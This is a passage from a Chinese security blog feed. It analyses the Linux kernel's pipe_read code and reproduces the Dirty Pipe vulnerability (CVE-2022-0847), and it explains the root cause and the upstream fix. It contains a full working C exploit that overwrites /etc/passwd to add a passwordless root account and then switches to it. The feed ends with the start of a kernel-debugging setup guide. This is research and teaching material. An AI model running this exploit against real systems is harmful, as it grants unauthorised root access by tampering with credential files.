大小的数据，这里我猜测，<code>copy_page_from_iter</code> 确实是这样的，不足 <code>PAGE_SIZE</code> 的数据填充 0 直接拷贝过来，就不续写了。</p><p>事实如何还得稍后深入分析 <code>copy_page_from_iter</code> 的源码。</p><h4 id="pipe-read"><a href="#pipe-read" class="headerlink" title="pipe_read"></a>pipe_read</h4><p>读的源码其实非常简单，我们同样也来一点一点分析。</p><h5 id="第一部分-1"><a href="#第一部分-1" class="headerlink" title="第一部分"></a>第一部分</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">    <span class="title function_">pipe_read</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *to)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> total_len = iov_iter_count(to);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line">    <span class="type">bool</span> was_full, wake_next_reader = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Null read succeeds. */</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line">    __pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We only wake up writers if the pipe was full when we started</span></span><br><span class="line"><span class="comment"> * reading in order to avoid unnecessary wakeups.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * But when we do wake up writers, we do so using a sync wakeup</span></span><br><span class="line"><span class="comment"> * (WF_SYNC), because we want them to get going and generate more</span></span><br><span class="line"><span class="comment"> * data for us.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依然先特判读取长度是否为 0。然后锁上管道，判断管道是否满。</p><h5 id="第二部分-1"><a href="#第二部分-1" class="headerlink" title="第二部分"></a>第二部分</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">    <span class="title function_">pipe_read</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *to)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> head = pipe-&gt;head;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> tail = pipe-&gt;tail;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">        <span class="keyword">if</span> (pipe-&gt;note_loss) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">watch_notification</span> <span class="title">n</span>;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (total_len &lt; <span class="number">8</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">                    ret = -ENOBUFS;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            n.type = WATCH_TYPE_META;</span><br><span class="line">            n.subtype = WATCH_META_LOSS_NOTIFICATION;</span><br><span class="line">            n.info = watch_sizeof(n);</span><br><span class="line">            <span class="keyword">if</span> (copy_to_iter(&amp;n, <span class="keyword">sizeof</span>(n), to) != <span class="keyword">sizeof</span>(n)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">                    ret = -EFAULT;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ret += <span class="keyword">sizeof</span>(n);</span><br><span class="line">            total_len -= <span class="keyword">sizeof</span>(n);</span><br><span class="line">            pipe-&gt;note_loss = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!pipe_empty(head, tail)) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];</span><br><span class="line">            <span class="type">size_t</span> chars = buf-&gt;len;</span><br><span class="line">            <span class="type">size_t</span> written;</span><br><span class="line">            <span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (chars &gt; total_len) &#123;</span><br><span class="line">                <span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_WHOLE) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">                        ret = -ENOBUFS;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                chars = total_len;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            error = pipe_buf_confirm(pipe, buf);</span><br><span class="line">            <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!ret)</span><br><span class="line">                    ret = error;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);</span><br><span class="line">            <span class="keyword">if</span> (unlikely(written &lt; chars)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!ret)</span><br><span class="line">                    ret = -EFAULT;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ret += chars;</span><br><span class="line">            buf-&gt;offset += chars;</span><br><span class="line">            buf-&gt;len -= chars;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Was it a packet buffer? Clean up and exit */</span></span><br><span class="line">            <span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) &#123;</span><br><span class="line">                total_len = chars;</span><br><span class="line">                buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!buf-&gt;len) &#123;</span><br><span class="line">                pipe_buf_release(pipe, buf);</span><br><span class="line">                spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">                <span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">                <span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_LOSS)</span><br><span class="line">                    pipe-&gt;note_loss = <span class="literal">true</span>;</span><br><span class="line">                <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                tail++;</span><br><span class="line">                pipe-&gt;tail = tail;</span><br><span class="line">                spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">            &#125;</span><br><span class="line">            total_len -= chars;</span><br><span class="line">            <span class="keyword">if</span> (!total_len)</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">/* common path: read succeeded */</span></span><br><span class="line">            <span class="keyword">if</span> (!pipe_empty(head, tail))<span class="comment">/* More to do? */</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!pipe-&gt;writers)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line">            ret = -EAGAIN;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        __pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We only get here if we didn&#x27;t actually read anything.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * However, we could have seen (and removed) a zero-sized</span></span><br><span class="line"><span class="comment"> * pipe buffer, and might have made space in the buffers</span></span><br><span class="line"><span class="comment"> * that way.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can&#x27;t make zero-sized pipe buffers by doing an empty</span></span><br><span class="line"><span class="comment"> * write (not even in packet mode), but they can happen if</span></span><br><span class="line"><span class="comment"> * the writer gets an EFAULT when trying to fill a buffer</span></span><br><span class="line"><span class="comment"> * that already got allocated and inserted in the buffer</span></span><br><span class="line"><span class="comment"> * array.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * So we still need to wake up any pending writers in the</span></span><br><span class="line"><span class="comment"> * _very_ unlikely case that the pipe was full, but we got</span></span><br><span class="line"><span class="comment"> * no data.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely(was_full))</span><br><span class="line">            wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line">        kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * But because we didn&#x27;t read anything, at this point we can</span></span><br><span class="line"><span class="comment"> * just return directly with -ERESTARTSYS if we&#x27;re interrupted,</span></span><br><span class="line"><span class="comment"> * since we&#x27;ve done any required wakeups and there&#x27;s no need</span></span><br><span class="line"><span class="comment"> * to mark anything accessed. And we&#x27;ve dropped the lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="keyword">if</span> (wait_event_interruptible_exclusive(pipe-&gt;rd_wait, pipe_readable(pipe)) &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> -ERESTARTSYS;</span><br><span class="line"></span><br><span class="line">        __pipe_lock(pipe);</span><br><span class="line">        was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);</span><br><span class="line">        wake_next_reader = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>紧接着跟一个 <code>for</code> 循环，中间包着一个宏可以不用管，这个应该没有编译进去。</p><p>先判是否非空，如果非空说明可以读数据，这里也不赘述取尾部缓冲区的操作了，不明白可以看前面的详细讲解。取出来之后呢，判断，如果该缓冲区数据的长度大于读取字节数 <code>chars &gt; total_len</code>，那么说明这个缓冲区的数据已经够了，读取所需要的字节数就不需要管了，中间判一个标记字段，如果设置了这个标记且还没有读过数据（ret&#x3D;&#x3D;0）那么报错退出，如果仅仅设置了标记，那么就直接 break。若没设置，则将取出的缓冲区长度设置为读取长度 <code>chars=total_len</code>。</p><p>随后再判一下缓冲区内容是否 good，将整个缓冲区拷贝给用户。若 <code>total_len&gt;chars</code>，则拷贝 <code>chars</code>（缓冲区长度），否则把<br><code>chars</code> 设置为要读取的总长度并读取这么多。然后设置一下缓冲区的 <code>offset</code> 和 <code>len</code>，其实这里差不多可以理解 <code>offset</code> 和 <code>len</code> 字段的具体含义了。</p><ul><li>len：缓冲区还有多少数据。</li><li>offset：缓冲区的数据从哪里开始。</li></ul><p>紧接着判，如果是一个分组管道，也就是网络管道，那么清除整个页并直接退出。</p><p>后面判断，如果读取完成之后缓冲区没数据了（同时，网络管道在这里设置为 0 就一定可以进这个分支），那么直接清除这个页。随后上读锁，让 <code>tail++</code>。如果没有要读取数据了，那么退出，随后看看如果还有要读取数据且管道不为空，则继续循环（<code>continue</code>）。</p><p>之后的分支都是处理管道为空的情况，不管是经历了一次读或者没有经历过读，都到这里来。判断写者还在不在，如果不在那么退循环，已经读取了若干数据也退循环，主要是没有经历过读 <code>ret==0</code>，那么在这里就一定能要给它一点数据，倘若管道设置为不能阻塞 <code>O_NONBLOCK</code>，那么直接返回错误。</p><p>后面的其实跟写差不多，但是这里有点不太明白，如果到这里没有读出数据的话，大概率是管道为空。那么需要唤醒写者来写些数据上去。如果管道满，那么唤醒下一个读者。</p><h5 id="第三部分-1"><a href="#第三部分-1" class="headerlink" title="第三部分"></a>第三部分</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">    <span class="title function_">pipe_read</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *to)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (pipe_empty(pipe-&gt;head, pipe-&gt;tail))</span><br><span class="line">        wake_next_reader = <span class="literal">false</span>;</span><br><span class="line">    __pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (was_full)</span><br><span class="line">        wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line">    <span class="keyword">if</span> (wake_next_reader)</span><br><span class="line">        wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">    kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">        file_accessed(filp);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果管道为空，那么不唤醒下一个读者。最后就是判断如果读取字节大于0，那么更新文件访问时间。</p><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><ol><li>遍历循环队列的列，如果能全读那么全读整个页并释放该页数据，并继续下个页的遍历。</li><li>长度不足以读完整个页，那么读部分直接退出。</li><li>根据管道情况选择唤醒读者或者写者。</li></ol><h4 id="EXP重写方案"><a href="#EXP重写方案" class="headerlink" title="EXP重写方案"></a>EXP重写方案</h4><p>前面写的 EXP 虽然能成功，但是还不够完善，因为经过调试之后，发现 <code>set_can_merge</code> 这里不需要遍历整个 pipe 缓冲区，正如前面分析的，如果管道为空或者读取字节为 <code>PAGE_SIZE</code> 整数倍，那么都直接复制页，不选择续写，所以我们连着读写 16 次就可以给所有的缓冲区打上 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SetCanMerge</span><span class="params">(<span class="type">int</span> fd[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf;</span><br><span class="line">    pipe(fd);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;PIPE_SIZE;i++)&#123;</span><br><span class="line">        write(fd[<span class="number">1</span>],<span class="string">&quot;a&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        read(fd[<span class="number">0</span>],&amp;buf,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line">    SetCanMerge(pipefd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]set all pipe page can merge done\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/etc/passwd&quot;</span>,O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret=splice(fd,<span class="literal">NULL</span>,pipefd[<span class="number">1</span>],<span class="literal">NULL</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]splice done,return value=%d\n&quot;</span>,ret);    </span><br><span class="line">    write(pipefd[<span class="number">1</span>],<span class="string">&quot;oots:&quot;</span>,<span class="number">5</span>);</span><br><span class="line">    system(<span class="string">&quot;su roots&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="splice分析"><a href="#splice分析" class="headerlink" title="splice分析"></a>splice分析</h3><p>同样使用上述 EXP，等到执行 <code>splice(fd,NULL,pipefd[1],NULL,1,0)</code> 。</p><p>这里我们在 <code>do_splice_to</code> 函数下断点，然后直接运行，<code>continue</code> 直接走完 16 次的读写。</p><p>最后调试的时候可以发现</p><img src="/2024/02/02/CVE-2022-0847/9.png" class=""><p>这里一部分将文件页挂在管道上。</p><p>这里发现管道的 head 值已经是 17 了，说明文件页挂在了 16 的位置（也就是 0 ）。</p><img src="/2024/02/02/CVE-2022-0847/10.png" class=""><p>此时发现，管道不为空，写入字节不为 <code>PAGE_SIZE</code> 整数倍，因此进入这个 if 分支。</p><img src="/2024/02/02/CVE-2022-0847/11.png" class=""><p>此时因为前面的填充，导致这个缓冲区一直带着 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 属性，并且在刚刚的 splice 当中并没有消除这个位。因此我们写可以跟着这个文件页后面写。</p><img src="/2024/02/02/CVE-2022-0847/12.png" class=""><p>这里也是可以看到文件成功被写入了。</p><p>我们创造了一个没有密码的 uid&#x3D;0 的用户，所以可以直接 su 切换。</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>这个漏洞利用的前提是：文件是可读的，我们需要通过零拷贝，把文件页挂在管道上，并且文件第一个字节不可写，因为我们需要至少一个字节的拷贝才能让文件页挂在管道缓冲区。随后写入字节不能为 PAGE_SIZE 的整数倍，否则不能续写。</p><p>所以这个漏洞基本可以认为是，只要具有读权限，基本就可以写这个文件了，因此我们修改 passwd 配置提权。</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>究其原因，pipe缓冲区在使用的时候，没有初始化 flag 字段，这个问题在很早版本前就引入了，到Linux 5.8 版本后，将各种类型的 pipe 缓冲区结构体合并之后，就引入了这个 bug。</p><p>修复这个问题只需要初始化 flag 字段即可，可以在github的提交上看到这次<a href="https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903">更新</a></p><img src="/2024/02/02/CVE-2022-0847/13.png" class=""><p>P.S，才刚学会 Kernel 调试环境的搭建，分析的肯定有不周到的地方，对于存在的问题，还请师傅们多多指出。</p><p>本篇分析于过年回家的路上完成，这路太堵了（哭）。</p><img src="/2024/02/02/CVE-2022-0847/14.png" class=""><p>希望能平安到家，也祝各位师傅们新年快乐。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;复现一下 dirty pipe漏洞&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://xia0ji233.github.io/categories/Linux/"/>
    
    <category term="CVE" scheme="https://xia0ji233.github.io/categories/Linux/CVE/"/>
    
    <category term="2022-0847" scheme="https://xia0ji233.github.io/categories/Linux/CVE/2022-0847/"/>
    
    
  </entry>
  
  <entry>
    <title>Kernel Pwn环境搭建</title>
    <link href="https://xia0ji233.github.io/2024/02/01/Linux_Kernel_Pwn1/"/>
    <id>https://xia0ji233.github.io/2024/02/01/Linux_Kernel_Pwn1/</id>
    <published>2024-02-01T07:00:00.000Z</published>
    <updated>2024-04-09T05:23:09.873Z</updated>
    
    <content type="html"><![CDATA[<p>准备开始搞 kernel pwn 了。</p><span id="more"></span><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h3><p>首先下载 kernel 源码：<a href="https://mirrors.tuna.tsinghua.edu.cn/kernel/">https://mirrors.tuna.tsinghua.edu.cn/kernel/</a></p><p>需要什么版本就指定什么版本好了。</p><p>因为我现在想复现 Dirty Cred，所以我下载了 5.8.1 版本的内核，解压之后使用 <code>make menuconfig</code> 可以打开一个配置界面，这里一定要把调试符号勾选，方便我们调试。</p><p>具体在 <code>kernel hacking-&gt;kernel debugging</code> 勾选，<code>kernel hacking-&gt;Compile-time checks and compiler options-&gt;Compile the kernel with debug info</code></p><img src="/2024/02/01/Linux_Kernel_Pwn1/1.png" class=""><p>因为我们还是使用 pwndbg 去调试，所以不勾选 kgdb 了，最后呢，使用命令 <code>make -j3 bzImage</code> 来编译内核。</p><p>这里我遇到一个错误，根据说法，安装开发环境即可，如图示命令安装。</p><img src="/2024/02/01/Linux_Kernel_Pwn1/2.png" class=""><p>这里遇到一个坑的地方，如果开 wsl 在 E 盘下面编译，不仅慢而且容易错，所以还是建议把源码移动到 home 目录下再去编译，几分钟就能搞定。</p><p>这里我修改了一点源码，因为之前编译遇到问题，具体修改参考这个：<a href="https://gitee.com/openeuler/kernel/pulls/141/files">https://gitee.com/openeuler/kernel/pulls/141/files</a></p><p>关于 wsl 编译错误的问题，我也参考了这个 issue：<a href="https://github.com/microsoft/WSL/issues/8045">https://github.com/microsoft/WSL/issues/8045</a></p><p>最后输出</p><img src="/2024/02/01/Linux_Kernel_Pwn1/3.png" class=""><p>我们的内核就编译完了。</p><h3 id="编译文件系统"><a href="#编译文件系统" class="headerlink" title="编译文件系统"></a>编译文件系统</h3><p>这里我们使用 busybox 制作根文件系统，下载地址 <a href="https://www.busybox.net/">https://www.busybox.net/</a> ，这里我选用了 1.32 版本。</p><p>同样使用 <code>make menuconfig</code> 打开配置界面。</p><p><code>Setting-&gt; (build option分页下)Build static binary (no shared libs)</code> 勾选，编译为静态链接的文件。</p><p><code>Networking Utilities-&gt;inetd</code> 取消勾选。</p><p>然后 <code>make -j8</code> 去编译，编译完成之后使用 <code>make install</code> 创建 <code>_install</code> 目录，完成之后进这个目录再创建一些文件夹 <code>mkdir -p  proc sys dev etc/init.d</code>，那么这里就是我们要打包的文件系统了。当然还需要创建一个 <code>init</code> 启动脚本，主要是挂载那些目录。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果不加下面三行，那么你退出qemu的时候会无限重启</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>然后建立系统的配置文件。</p><p><code>etc/passwd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 